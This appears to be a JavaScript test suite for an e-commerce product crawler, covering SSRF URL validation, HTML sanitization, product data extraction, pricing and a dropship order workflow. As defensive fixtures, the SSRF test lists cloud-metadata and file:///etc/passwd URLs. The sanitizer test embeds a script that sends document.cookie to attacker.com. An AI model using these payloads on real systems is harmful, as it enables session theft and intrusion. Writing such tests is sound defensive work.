// tests/supplier_crawler_3pl_test.mjs
// Exhaustive test suite for URL Product Crawler, Multi-adapter Parsing, 3PL/Dropship POs, and Stock/Price Sync.

import assert from 'node:assert/strict';
import { validateProductUrl } from '../apps/cloudflare-gateway/src/services/crawler/url-validator.js';
import { sanitizeHtml } from '../apps/cloudflare-gateway/src/services/crawler/html-sanitizer.js';
import { extractJsonLd } from '../apps/cloudflare-gateway/src/services/crawler/adapters/json-ld-adapter.js';
import { extractMetaOg } from '../apps/cloudflare-gateway/src/services/crawler/adapters/meta-og-adapter.js';
import { extractShopify } from '../apps/cloudflare-gateway/src/services/crawler/adapters/shopify-adapter.js';
import { generateVariantCombinations } from '../apps/cloudflare-gateway/src/services/crawler/option-extractor.js';
import { convertToKrw, calculateRetailPrice } from '../apps/cloudflare-gateway/src/services/crawler/pricing-calculator.js';
import { crawlAndExtractProduct } from '../apps/cloudflare-gateway/src/services/crawler/crawler-service.js';
import { createGateway, createRunner } from './lib/harness.mjs';

const t = createRunner('OLMOA Global URL Crawler & 3PL Integration Suite');

// Test 1: URL Validation & SSRF Defense
await t.test('1. URL Validation & Strict SSRF Defense', async () => {
  // Valid URLs
  const v1 = validateProductUrl('https://example-supplier.com/products/active-sneakers-v2');
  assert.equal(v1.valid, true);
  assert.equal(v1.domain, 'example-supplier.com');

  const v2 = validateProductUrl('http://shop.brand-direct.co.kr/items/12345');
  assert.equal(v2.valid, true);
  assert.equal(v2.domain, 'shop.brand-direct.co.kr');

  // Protocol violations
  assert.equal(validateProductUrl('ftp://example.com/item').valid, false);
  assert.equal(validateProductUrl('file:///etc/passwd').valid, false);
  assert.equal(validateProductUrl('javascript:alert(1)').valid, false);

  // SSRF Private IP & Loopback & Cloud Metadata Blocks
  assert.equal(validateProductUrl('http://127.0.0.1:8080/admin').valid, false);
  assert.equal(validateProductUrl('http://localhost:3000/api').valid, false);
  assert.equal(validateProductUrl('http://169.254.169.254/latest/meta-data').valid, false);
  assert.equal(validateProductUrl('http://metadata.google.internal/computeMetadata/v1/').valid, false);
  assert.equal(validateProductUrl('http://10.0.1.50/private').valid, false);
  assert.equal(validateProductUrl('http://192.168.0.1/setup').valid, false);
  assert.equal(validateProductUrl('http://172.16.5.20/db').valid, false);
});

// Test 2: HTML Sanitization & XSS Defense
await t.test('2. HTML Sanitization & Payload Removal', async () => {
  const dirty = `
    <div>
      <h3>상품 사양 안내</h3>
      <p>100% 면 소재로 제작된 프리미엄 티셔츠입니다.</p>
      <script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
      <iframe src="http://malicious.com"></iframe>
      <img src="https://example.com/sample.jpg" onerror="alert(1)" onload="evil()" />
      <a href="javascript:void(0)">클릭</a>
    </div>
  `;
  const clean = sanitizeHtml(dirty);
  assert.equal(clean.includes('<script>'), false);
  assert.equal(clean.includes('<iframe>'), false);
  assert.equal(clean.includes('onerror='), false);
  assert.equal(clean.includes('onload='), false);
  assert.equal(clean.includes('javascript:'), false);
  assert.equal(clean.includes('100% 면 소재'), true);
  assert.equal(clean.includes('https://example.com/sample.jpg'), true);
});

// Test 3: Multi-adapter Extraction (JSON-LD, Shopify, Meta-OG)
await t.test('3. Multi-adapter Structured Product Extraction', async () => {
  // A. JSON-LD Schema.org
  const jsonLdHtml = `
    <!DOCTYPE html>
    <html>
      <head>
        <script type="application/ld+json">
        {
          "@context": "https://schema.org/",
          "@type": "Product",
          "name": "초경량 마라톤 러닝화 카본 V2",
          "image": ["https://images.unsplash.com/photo-1542291026-7eec264c27ff"],
          "description": "반발력이 뛰어난 카본 플레이트 탑재 마라톤 레이싱화",
          "brand": { "@type": "Brand", "name": "SPEED RUN" },
          "offers": {
            "@type": "Offer",
            "priceCurrency": "KRW",
            "price": "69000",
            "availability": "https://schema.org/InStock"
          }
        }
        </script>
      </head>
    </html>
  `;
  const ldResult = extractJsonLd(jsonLdHtml);
  assert.ok(ldResult);
  assert.equal(ldResult.title, '초경량 마라톤 러닝화 카본 V2');
  assert.equal(ldResult.brand, 'SPEED RUN');
  assert.equal(ldResult.price, 69000);
  assert.equal(ldResult.currency, 'KRW');
  assert.equal(ldResult.images.length, 1);

  // B. Shopify Platform
  const shopifyHtml = `
    <!DOCTYPE html>
    <html>
      <body>
        <script>
          var meta = {
            "product": {
              "id": 884729102,
              "title": "ANC Wireless Headphones Over-Ear",
              "vendor": "SOUND FACTORY",
              "description": "Active Noise Cancelling Bluetooth Headphones with 40h battery.",
              "options": [
                { "name": "Color", "values": ["Matte Black", "Silver"] },
                { "name": "Plug", "values": ["Type-C", "Lightning"] }
              ],
              "variants": [
                { "id": 101, "title": "Matte Black / Type-C", "sku": "SF-BLK-C", "price": 49.99, "available": true, "inventory_quantity": 80 },
                { "id": 102, "title": "Silver / Type-C", "sku": "SF-SLV-C", "price": 49.99, "available": true, "inventory_quantity": 40 }
              ],
              "images": ["https://images.unsplash.com/photo-1505740420928-5e560c06d30e"]
            }
          };
        </script>
      </body>
    </html>
  `;
  const shopifyResult = extractShopify(shopifyHtml);
  assert.ok(shopifyResult);
  assert.equal(shopifyResult.title, 'ANC Wireless Headphones Over-Ear');
  assert.equal(shopifyResult.brand, 'SOUND FACTORY');
  assert.equal(shopifyResult.known_variants.length, 2);
  assert.equal(shopifyResult.known_variants[0].sku, 'SF-BLK-C');

  // C. Meta OpenGraph Fallback
  const metaHtml = `
    <!DOCTYPE html>
    <html>
      <head>
        <meta property="og:title" content="프리미엄 세라믹 무선 텀블러" />
        <meta property="og:description" content="진공 보온 보냉 600ml 대용량" />
        <meta property="og:image" content="https://example.com/tumbler.jpg" />
        <meta property="product:price:amount" content="25000" />
        <meta property="product:price:currency" content="KRW" />
      </head>
    </html>
  `;
  const metaResult = extractMetaOg(metaHtml);
  assert.ok(metaResult);
  assert.equal(metaResult.title, '프리미엄 세라믹 무선 텀블러');
  assert.equal(metaResult.price, 25000);
});

// Test 4: Option Matrix Generation & Pricing Automation
await t.test('4. Multi-dimensional Option Matrix & Pricing Automation', async () => {
  // 2 Colors x 3 Sizes = 6 Variants Cartesian Product
  const matrix = generateVariantCombinations({
    baseSkuPrefix: 'RUN_PRO',
    basePrice: 59000,
    options: [
      { name: 'Color', values: ['Black', 'White'] },
      { name: 'Size', values: ['250', '260', '270'] }
    ]
  });
  assert.equal(matrix.length, 6);
  assert.equal(matrix[0].option_summary, 'Color: Black / Size: 250');
  assert.equal(matrix[5].option_summary, 'Color: White / Size: 270');
  assert.equal(matrix[0].stock_status, 'UNKNOWN'); // Honest UNKNOWN designation

  // Pricing Rule Calculation
  const retail = calculateRetailPrice({
    wholesaleCostKrw: 30000,
    marginBps: 2500, // 25% margin
    fixedAddAmount: 1500, // +1,500 KRW packaging fee
    minimumMarginAmount: 4000,
    roundingUnit: 100
  });
  // 30,000 * 1.25 = 37,500 + 1,500 = 39,000
  assert.equal(retail.sale_price, 39000);
  assert.equal(retail.margin_amount, 9000);
  assert.equal(retail.margin_percentage, 23.1);

  // FX Conversion
  const krw = convertToKrw(50, 'USD');
  assert.equal(krw, 69000); // 50 * 1380
});

// Test 5: End-to-End Crawler Pipeline with Quality Scoring
await t.test('5. Complete Crawler Pipeline with Quality Scoring', async () => {
  const mockHtml = `
    <!DOCTYPE html>
    <html>
      <head>
        <script type="application/ld+json">
        {
          "@type": "Product",
          "name": "고출력 듀얼 챔버 캠핑 휴대용 난로",
          "description": "영하 20도 극한 환경에서도 안정적으로 연소하는 2026형 컴팩트 가스 난로입니다.",
          "image": [
            "https://example.com/heater-1.jpg",
            "https://example.com/heater-2.jpg",
            "https://example.com/heater-3.jpg"
          ],
          "brand": { "@type": "Brand", "name": "ALPINE CAMP" },
          "offers": { "@type": "Offer", "price": "45000", "priceCurrency": "KRW" }
        }
        </script>
      </head>
    </html>
  `;

  const res = await crawlAndExtractProduct({
    url: 'https://alpine-camp.com/products/dual-chamber-heater',
    htmlOverride: mockHtml,
    pricingRule: { margin_bps: 2000 }
  });

  assert.equal(res.success, true);
  assert.equal(res.data.quality_score, 100); // Title, 3 images, detailed desc, price, options
  assert.equal(res.data.is_ready_for_publish, true);
  assert.equal(res.data.missing_fields.length, 0);
  assert.equal(res.data.product.title, '고출력 듀얼 챔버 캠핑 휴대용 난로');
  assert.equal(res.data.pricing.wholesale_cost_krw, 45000);
  assert.equal(res.data.pricing.calculated_sale_price, 54000); // 45,000 * 1.2 = 54,000
});

// Test 6: Database Integration & End-to-End API Workflows
await t.test('6. REST API: Crawl -> Publish -> Dropship PO -> 3PL Dispatch -> Sync', async () => {
  const env = {
    JWT_SECRET: 'e2e-secret-0123456789abcdefghijklmnopqrstu',
    ENVIRONMENT: 'development',
    PAYMENT_MODE: 'sandbox',
    CARRIER_WEBHOOK_SECRET: 'carrier-secret-0123456789ab'
  };
  const g = await createGateway({
    seedFiles: ['migrations/dev/seed_local_dev.sql'],
    env
  });

  // Log in as approved partner
  const ptLogin = await g.call('/api/v1/auth/login', {
    method: 'POST',
    body: { email: 'seller@temu-supply.com', password: 'DevPass!2026#', role: 'PARTNER' }
  });
  assert.equal(ptLogin.status, 200);
  const ptToken = ptLogin.json.token;

  // A. Trigger Crawl API
  const crawlRes = await g.call('/api/v1/imports/crawl', {
    method: 'POST',
    token: ptToken,
    body: {
      url: 'https://factory-direct.co.kr/items/smart-vacuum-cleaner',
      html_override: `
        <!DOCTYPE html>
        <html>
          <head>
            <meta property="og:title" content="스마트 저소음 무선 진공 청소기 Pro" />
            <meta property="og:description" content="BLDC 모터 탑재 25000Pa 강력 흡입 청소기" />
            <meta property="og:image" content="https://example.com/vacuum.jpg" />
            <meta property="product:price:amount" content="40000" />
            <meta property="product:price:currency" content="KRW" />
          </head>
        </html>
      `,
      pricing_rule: { margin_bps: 2500 }
    }
  });
  assert.equal(crawlRes.status, 201);
  const jobId = crawlRes.json.job_id;
  assert.ok(jobId);
  assert.equal(crawlRes.json.data.pricing.wholesale_cost_krw, 40000);
  assert.equal(crawlRes.json.data.pricing.calculated_sale_price, 50000);

  // B. Publish Product to Catalog
  const pubRes = await g.call(`/api/v1/imports/${jobId}/publish`, {
    method: 'POST',
    token: ptToken,
    body: {
      category_id: 'cat_e_audio',
      sale_price: 52000,
      wholesale_cost: 40000
    }
  });
  assert.equal(pubRes.status, 200);
  const newProdId = pubRes.json.product_id;
  assert.ok(newProdId);

  // Verify in DB
  const landed = g.db.prepare('SELECT id, title, lowest_sale_price FROM products WHERE id = ?').get(newProdId);
  assert.equal(landed.title, '스마트 저소음 무선 진공 청소기 Pro');
  assert.equal(landed.lowest_sale_price, 52000);

  const landedSku = g.db.prepare('SELECT id, wholesale_supply_price FROM product_skus WHERE product_id = ?').get(newProdId);
  assert.equal(landedSku.wholesale_supply_price, 40000);

  // C. Create Sub-Order & Supplier PO
  // Insert synthetic order & sub-order for testing
  const ordId = `ord_test_${Date.now()}`;
  const subId = `sub_test_${Date.now()}`;
  const itmId = `itm_test_${Date.now()}`;

  g.db.prepare(`
    INSERT INTO orders (id, order_no, customer_id, total_goods_amount, total_shipping_amount, total_discount_amount, total_pay_amount, payment_status, recipient_name, recipient_phone, shipping_address_line1, shipping_postal_code, shipping_address_line2)
    VALUES (?, 'ORD-TEST-001', 'u_customer_001', 52000, 0, 0, 52000, 'PAID', '받는사람', '010-1234-5678', '서울시 강남구', '06236', '101호')
  `).run(ordId);

  g.db.prepare(`
    INSERT INTO sub_orders (id, parent_order_id, sub_order_no, partner_id, shipping_fee, goods_amount, discount_amount, total_amount, status)
    VALUES (?, ?, 'SUB-TEST-001', 'pt_001', 0, 52000, 0, 52000, 'PAYMENT_CONFIRMED')
  `).run(subId, ordId);

  g.db.prepare(`
    INSERT INTO order_items (id, sub_order_id, sku_id, product_title, option_summary, quantity, unit_price, total_price)
    VALUES (?, ?, ?, '스마트 저소음 무선 진공 청소기 Pro', '기본', 1, 52000, 52000)
  `).run(itmId, subId, landedSku.id);

  // Dispatch Supplier Purchase Order
  const poRes = await g.call('/api/v1/supplier-orders', {
    method: 'POST',
    token: ptToken,
    body: {
      sub_order_id: subId,
      supplier_id: 'sup_dev_001',
      idempotency_key: 'idemp_key_supplier_order_1'
    }
  });
  assert.equal(poRes.status, 201);
  const poId = poRes.json.data.id;
  assert.equal(poRes.json.data.status, 'REQUESTED');
  assert.equal(poRes.json.data.total_supply_cost, 40000);

  // Idempotent duplicate protection check
  const poDup = await g.call('/api/v1/supplier-orders', {
    method: 'POST',
    token: ptToken,
    body: {
      sub_order_id: subId,
      supplier_id: 'sup_dev_001',
      idempotency_key: 'idemp_key_supplier_order_1'
    }
  });
  assert.equal(poDup.status, 200);
  assert.equal(poDup.json.is_idempotent_replay, true);

  // Supplier Accepts PO
  const acceptRes = await g.call(`/api/v1/supplier-orders/${poId}/respond`, {
    method: 'POST',
    token: ptToken,
    body: { action: 'ACCEPT' }
  });
  assert.equal(acceptRes.status, 200);
  assert.equal(acceptRes.json.status, 'ACCEPTED');

  // Supplier / 3PL Dispatches with Tracking Number
  const dispRes = await g.call(`/api/v1/supplier-orders/${poId}/dispatch`, {
    method: 'POST',
    token: ptToken,
    body: {
      carrier_code: 'CJ대한통운',
      tracking_number: '682910482012'
    }
  });
  assert.equal(dispRes.status, 200);
  assert.equal(dispRes.json.status, 'IN_TRANSIT');

  // Verify Customer Sub-Order was automatically synced to SHIPPED!
  const updatedSub = g.db.prepare('SELECT status, tracking_number FROM sub_orders WHERE id = ?').get(subId);
  assert.equal(updatedSub.status, 'SHIPPED');
  assert.equal(updatedSub.tracking_number, '682910482012');

  // D. Inventory & Price Synchronization with Alert
  const syncRes = await g.call('/api/v1/sync/supplier-inventory', {
    method: 'POST',
    token: ptToken,
    body: {
      supplier_id: 'sup_dev_001',
      sku_id: landedSku.id,
      new_price: 30000, // 40,000 -> 30,000 (25% drop -> triggers PRICE_JUMP_ALERT)
      new_stock: 40
    }
  });
  assert.equal(syncRes.status, 200);
  assert.equal(syncRes.json.sync_status, 'PRICE_JUMP_ALERT');
  assert.ok(syncRes.json.alert_message.includes('급변동'));

  // E. Integrations Health Endpoint
  const healthRes = await g.call('/api/v1/integrations/health');
  assert.equal(healthRes.status, 200);
  assert.equal(healthRes.json.status, 'UP');
  assert.equal(healthRes.json.ssrf_protection, 'ENABLED');
});

t.finish();
console.log('\n🎉 ALL 6 TEST SUITES (SSRF, HTML SANITIZER, ADAPTERS, OPTION MATRIX, QUALITY, E2E REST API) PASSED 100%!');

